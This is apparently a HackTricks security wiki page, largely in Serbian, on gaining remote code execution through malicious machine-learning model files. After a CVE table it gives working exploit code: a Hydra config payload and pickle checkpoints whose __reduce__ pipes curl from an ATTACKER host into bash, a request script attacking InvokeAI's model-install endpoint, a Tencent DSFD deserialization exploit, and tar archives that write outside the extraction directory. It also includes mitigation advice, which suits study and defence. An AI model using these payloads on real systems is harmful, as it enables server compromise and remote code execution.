# RCE modela

{{#include ../banners/hacktricks-training.md}}

## Učitavanje modela za RCE

Modeli mašinskog učenja obično se dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch, itd. Ti modeli mogu biti učitani na developerske mašine ili u produkcione sisteme radi korišćenja. Obično modeli ne bi trebalo da sadrže zlonamerni kod, ali postoje slučajevi gde model može biti iskorišćen za izvršavanje proizvoljnog koda na sistemu kao namerna funkcija ili zbog ranjivosti u biblioteci za učitavanje modela.

U vreme pisanja, ovo su neki primeri ovakvih ranjivosti:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Štaviše, postoje neki modeli zasnovani na pickle-u u Pythonu, kao oni koje koristi [PyTorch](https://github.com/pytorch/pytorch/security), koji mogu poslužiti za izvršenje proizvoljnog koda na sistemu ako se ne učitaju sa `weights_only=True`. Dakle, svaki model zasnovan na pickle-u može biti posebno podložan ovakvim napadima, čak i ako nije naveden u tabeli iznad.

### Hydra metapodaci → RCE (radi čak i sa safetensors)

`hydra.utils.instantiate()` uvozi i poziva bilo koji dotted `_target_` u objektu konfiguracije/metapodataka. Kada biblioteke proslede **nepouzdane metapodatke modela** u `instantiate()`, napadač može dostaviti callable i argumente koji se izvršavaju odmah tokom učitavanja modela (nije potreban pickle).

Primer payload-a (radi u `.nemo` `model_config.yaml`, repo `config.json`, ili `__metadata__` unutar `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- Pokreće se pre inicijalizacije modela u NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, i FlexTok loaders.
- Hydra-ina lista blokiranih stringova može se zaobići putem alternativnih import puteva (npr. `enum.bltns.eval`) ili imena razrešenih od strane aplikacije (npr. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok takođe parsira stringified metadata pomoću `ast.literal_eval`, što omogućava DoS (eksploziju CPU/pamćenja) pre Hydra poziva.

### 🆕  InvokeAI RCE preko `torch.load` (CVE-2024-12029)

InvokeAI je popularni open-source web interfejs za Stable-Diffusion. Verzije **5.3.1 – 5.4.2** izlažu REST endpoint `/api/v2/models/install` koji korisnicima omogućava da preuzimaju i učitavaju modele sa proizvoljnih URL-ova.

Interno, endpoint na kraju poziva:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

Ranljivosti je dodeljen **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Koraci za eksploataciju

1. Kreirajte zlonamerni checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Postavite `payload.ckpt` na HTTP server koji kontrolišete (npr. `http://ATTACKER/payload.ckpt`).
3. Pokrenite ranjiv endpoint (nije potrebna autentifikacija):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Kada InvokeAI preuzme fajl, pozove `torch.load()` → `os.system` gadget se pokreće i napadač dobija izvršavanje koda u kontekstu InvokeAI procesa.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.

#### Uslovi

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` dostupan napadaču  
•  Proces ima dozvole za izvršavanje shell komandi

#### Mitigacije

* Ažurirajte na **InvokeAI ≥ 5.4.3** – patch postavlja `scan=True` podrazumevano i izvršava skeniranje na malver pre deserijalizacije.  
* Pri programskom učitavanju checkpoints koristite `torch.load(file, weights_only=True)` ili novi [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Primenite liste dozvoljenih / potpise za izvore modela i pokrenite servis sa najmanjim mogućim privilegijama.

> ⚠️ Imajte na umu da je **bilo koji** Python format zasnovan na pickle-u (uključujući mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` fajlove) inherentno nesiguran za deserijalizaciju iz nepouzdanih izvora.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE preko nesigurnog `torch.load` (CVE-2025-23298)

NVIDIA-ov Transformers4Rec (deo Merlina) izložio je nesiguran checkpoint loader koji direktno poziva `torch.load()` na putanjama koje obezbeđuje korisnik. Pošto `torch.load` zavisi od Python `pickle`, checkpoint kontrolisan od strane napadača može izvršiti proizvoljan kod putem reducera tokom deserializacije.

Ranljiv put (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Zašto ovo vodi do RCE: U Python pickle, objekat može definisati reducer (`__reduce__`/`__setstate__`) koji vraća callable i argumente. Pozivni objekat (callable) se izvršava tokom unpickling-a. Ako takav objekat postoji u checkpoint-u, on se izvršava pre nego što se koriste bilo koje težine.

Minimalni maliciozni checkpoint primer:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vektori isporuke i radijus štete:
- Trojanized checkpoints/models deljeni putem repos, buckets ili artifact registries
- Automatizovani resume/deploy pipelines koji automatski učitavaju checkpoints
- Izvršavanje se odvija unutar training/inference workers, često sa povišenim privilegijama (npr. root u containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zamenio je direktno `torch.load()` ograničenim, allow-listed deserializerom implementiranim u `transformers4rec/utils/serialization.py`. Novi loader validira tipove/polja i sprečava da se proizvoljne callables pozivaju tokom učitavanja.

Odbrambena uputstva specifična za PyTorch checkpoints:
- Ne unpickle-ujte nepouzdane podatke. Preferirajte neizvršne formate poput [Safetensors](https://huggingface.co/docs/safetensors/index) ili ONNX kad je moguće.
- Ako morate koristiti PyTorch serialization, osigurajte `weights_only=True` (podržano u novijim verzijama PyTorch) ili koristite custom allow-listed unpickler sličan Transformers4Rec patchu.
- Sprovodite proveru porekla modela i potpisa i pokrećite deserializaciju u sandboxu (seccomp/AppArmor; non-root korisnik; ograničen FS i bez izlaza na mrežu).
- Pratite neočekivane child procese iz ML servisa u vreme učitavanja checkpoint-a; trace `torch.load()`/`pickle` korišćenje.

POC i reference na ranjivost/patch:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Primer – kreiranje malicioznog PyTorch modela

- Napravite model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Učitaj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent-ov FaceDetection-DSFD izlaže `resnet` endpoint koji deserializes podatke pod kontrolom korisnika. ZDI je potvrdio da udaljeni napadač može primorati žrtvu da učita malicioznu stranicu/datoteku, naterati je da pošalje pažljivo pripremljen serialized blob na taj endpoint i pokrene deserialization kao `root`, što dovodi do potpune kompromitacije.

Tok exploita odražava tipično pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.

## Modeli do Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ili, pomoću sledećeg koda možete napraviti model koji će prilikom učitavanja kreirati symlink ka `/tmp` direktorijumu:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Detaljna analiza: Keras .keras deserialization and gadget hunting

Za fokusiran vodič o .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8 i post-fix gadget discovery inside the allowlist, pogledajte:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Reference

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
